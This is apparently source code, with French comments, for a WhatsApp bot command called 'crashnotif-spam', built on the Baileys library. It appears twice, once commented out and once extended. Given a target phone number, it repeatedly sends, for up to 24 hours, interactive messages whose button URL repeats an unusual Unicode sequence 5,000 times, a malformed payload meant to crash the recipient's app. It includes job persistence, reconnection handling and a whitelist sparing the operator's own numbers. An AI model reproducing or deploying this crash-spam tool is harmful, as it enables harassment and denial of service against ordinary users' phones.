// ./commands/crashnotif.js

// Liste blanche des numeros proteges — tableau WHITELIST_NUMBERS dans js/config.js
import { isWhitelisted, WHITELIST_BLOCKED_MESSAGE } from "../js/config.js";
/*
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "crashnotif-spam",
  description: "Lance un spam avec la fonction crashnotif",

  async execute(context) {
    const { sock, from, msg, args } = context;

    const targetNumber = args?.[0] || "";

    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const START = Date.now();
      const DURATION = 24 * 60 * 60 * 1000;      // 24 heures
      const ACTION_INTERVAL = 5 * 60 * 1000;     // 5 minutes
      const MAX_PER_HOUR = 12; // 12 par heures

      let hourCount = 0;
      let hourStart = Date.now();

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY",
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com"
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await crashnotif(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      return { success: true, message: `Spam crashnotif terminé sur ${number}` };

    } catch (error) {
      console.error("❌ Erreur crashnotif-spam :", error);
      return { success: false, message: "Spam crashnotif interrompu" };
    }
  }
};
*/


// ./commands/crashnotif-command.js

import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "crashnotif-spam",
  description: "Lance un spam avec la fonction crashnotif",

  // Commande LONGUE : le serveur la confie au moteur de jobs (js/jobs.js) et
  // REPOND IMMEDIATEMENT au navigateur. Le job continue en arriere-plan pendant
  // toute sa duree, meme onglet ferme, et reprend apres un redemarrage serveur.
  background: true,

  async execute(context) {
    const { from, msg, args } = context;

    // Socket "vivante" : en 24h le bot se deconnecte/reconnecte plusieurs fois.
    // On relit la socket courante a chaque action au lieu d'une reference morte.
    const sock = () => context.sock;

    const targetNumber = args?.[0] || "";
    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    // ---- LISTE BLANCHE (couche 3, dernier rempart avant l'envoi) ----
    if (isWhitelisted(number) || isWhitelisted(targetNumber)) {
      return { success: false, blocked: true, message: WHITELIST_BLOCKED_MESSAGE };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const config = {
        duration: context.durationMs || 24 * 60 * 60 * 1000, // 24 heures
        actionInterval: 5 * 60 * 1000,     // 5 minutes
        maxPerHour: 12, // 12 par heures
      };

      const startTime = context.startedAt || Date.now();

      // Echeance ABSOLUE fournie par le moteur de jobs : apres un redemarrage du
      // serveur on reprend sur le TEMPS RESTANT (pas 24h de plus).
      const DEADLINE = context.deadline || startTime + config.duration;

      // Compteurs restaures depuis la table bot_jobs (reprise apres redeploy).
      let sent = context.state?.sent || 0;
      let hourCount = context.state?.hourCount || 0;
      let hourStart = context.state?.hourStart || startTime;

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY",
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com"
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      while (Date.now() < DEADLINE) {
        // Bouton "Stop" du site (ou arret du serveur) -> sortie propre.
        if (context.isCancelled?.()) break;

        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        // Bot deconnecte ? On PATIENTE : il se reconnecte tout seul et le job
        // repart. Un job de 24h ne doit JAMAIS mourir d'une coupure de reseau.
        const live = await context.waitForSocket?.();
        if (!live) break;

        if (hourCount < config.maxPerHour) {
          // try/catch PAR ACTION : un echec ponctuel (reseau, socket morte, 429)
          // n'interrompt plus les 24h comme le faisait le seul catch global.
          try {
            await crashnotif(live, target);
            hourCount++;
            sent++;
          } catch (actionError) {
            console.error("⚠️ crashnotif-spam action ratee (" + number + ") :", actionError?.message || actionError);
            context.onStatus?.("Action ratée — nouvelle tentative dans 5 min");
          }
        }

        // Progression -> Socket.IO + table bot_jobs (visible meme onglet ferme)
        context.onProgress?.({ sent, hourCount, hourStart });

        // Sommeil ANNULABLE : le bouton Stop agit immediatement, pas dans 5 min.
        await (context.sleep
          ? context.sleep(config.actionInterval)
          : new Promise(r => setTimeout(r, config.actionInterval)));
      }

      const cancelled = !!context.isCancelled?.();
      return {
        success: true,
        cancelled,
        message: cancelled
          ? `Spam crashnotif arrêté sur ${number} (${sent} action(s) envoyée(s))`
          : `Spam crashnotif terminé sur ${number} (${sent} action(s) envoyée(s))`
      };

    } catch (error) {
      console.error("❌ Erreur crashnotif-spam :", error);
      return { success: false, message: "Spam crashnotif interrompu" };
    }
  }
};